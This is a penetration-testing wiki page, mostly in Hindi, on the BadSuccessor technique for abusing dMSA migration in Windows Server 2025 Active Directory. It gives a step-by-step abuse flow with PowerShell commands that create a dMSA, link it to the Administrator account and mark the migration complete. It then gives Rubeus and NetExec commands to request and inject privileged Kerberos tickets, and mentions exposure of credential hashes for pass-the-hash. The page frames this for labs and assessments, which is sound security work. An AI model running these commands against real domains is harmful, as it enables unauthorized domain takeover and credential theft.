# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**BadSuccessor** **delegated Managed Service Account** (**dMSA**) migration workflow का दुरुपयोग करता है, जिसे **Windows Server 2025** में introduced किया गया था। एक dMSA को **`msDS-ManagedAccountPrecededByLink`** के जरिए एक legacy account से जोड़ा जा सकता है और **`msDS-DelegatedMSAState`** में stored migration states के through move किया जा सकता है। अगर एक attacker एक writable OU में dMSA create कर सके और उन attributes को control कर सके, तो KDC attacker-controlled dMSA के लिए **linked account के authorization context** के साथ tickets issue कर सकता है।

व्यवहार में इसका मतलब है कि एक low-privileged user जिसके पास केवल delegated OU rights हैं, एक नया dMSA create कर सकता है, उसे `Administrator` पर point कर सकता है, migration state complete कर सकता है, और फिर एक ऐसा TGT प्राप्त कर सकता है जिसका PAC privileged groups जैसे **Domain Admins** शामिल करता है।

## dMSA migration details that matter

- dMSA एक **Windows Server 2025** feature है।
- `Start-ADServiceAccountMigration` migration को **started** state में set करता है।
- `Complete-ADServiceAccountMigration` migration को **completed** state में set करता है।
- `msDS-DelegatedMSAState = 1` का मतलब है migration started।
- `msDS-DelegatedMSAState = 2` का मतलब है migration completed।
- Legitimate migration के दौरान, dMSA को superseded account को transparently replace करना होता है, इसलिए KDC/LSA वह access preserve करते हैं जो previous account के पास पहले से था।

Microsoft Learn यह भी note करता है कि migration के दौरान original account dMSA से tied होता है और dMSA को वही access करने के लिए intended किया गया है जो old account कर सकता था। यही security assumption BadSuccessor abuse करता है।

## Requirements

1. ऐसा domain जहाँ **dMSA exists** करता हो, यानी AD side पर **Windows Server 2025** support present हो।
2. Attacker कुछ OU में `msDS-DelegatedManagedServiceAccount` objects create कर सके, या वहाँ equivalent broad child-object creation rights हों।
3. Attacker relevant dMSA attributes लिख सके या recently created dMSA को पूरी तरह control कर सके।
4. Attacker domain-joined context से या ऐसे tunnel से Kerberos tickets request कर सके जो LDAP/Kerberos तक पहुँचता हो।

### Practical checks

सबसे साफ operator signal यह verify करना है कि domain/forest level सही है और confirm करना है कि environment पहले से नया Server 2025 stack use कर रहा है:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
यदि आप `Windows2025Domain` और `Windows2025Forest` जैसे values देखते हैं, तो **BadSuccessor / dMSA migration abuse** को प्राथमिकता वाली check मानें।

आप public tooling के साथ dMSA creation के लिए delegated writable OUs को भी enumerate कर सकते हैं:
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Abuse flow

1. एक dMSA बनाएँ ऐसे OU में जहाँ आपके पास delegated create-child rights हों।
2. **`msDS-ManagedAccountPrecededByLink`** को किसी privileged target के DN पर सेट करें, जैसे `CN=Administrator,CN=Users,DC=corp,DC=local`।
3. migration को completed mark करने के लिए **`msDS-DelegatedMSAState`** को `2` पर सेट करें।
4. नए dMSA के लिए एक TGT request करें और privileged services तक access करने के लिए returned ticket का उपयोग करें।

PowerShell example:
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Ticket request / operational tooling examples:
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## यह privilege escalation से अधिक क्यों है

वैध migration के दौरान, Windows को नए dMSA की भी जरूरत होती है ताकि वह उन tickets को handle कर सके जो cutover से पहले पुराने account के लिए issue हुई थीं। इसी वजह से dMSA-related ticket material **`KERB-DMSA-KEY-PACKAGE`** flow में **current** और **previous** keys शामिल कर सकता है।

हमलावर-नियंत्रित fake migration के लिए, यह behavior BadSuccessor को इसमें बदल सकता है:

- **Privilege escalation** क्योंकि PAC में privileged group SIDs inherit हो जाते हैं।
- **Credential material exposure** क्योंकि previous-key handling vulnerable workflows में predecessor के RC4/NT hash के बराबर material expose कर सकती है।

इससे यह technique सीधे domain takeover और बाद की operations जैसे pass-the-hash या broader credential compromise, दोनों के लिए उपयोगी बन जाती है।

## Patch status पर notes

मूल BadSuccessor behavior **सिर्फ एक theoretical 2025 preview issue नहीं** है। Microsoft ने इसे **CVE-2025-53779** assign किया और **August 2025** में security update जारी किया। इस attack को दस्तावेज़ित रखें:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **assessments के दौरान OU delegations और dMSA exposure की validation**

सिर्फ इसलिए कि dMSA मौजूद है, यह मानकर न चलें कि Windows Server 2025 domain vulnerable है; patch level verify करें और सावधानी से test करें।

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [HTB: Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
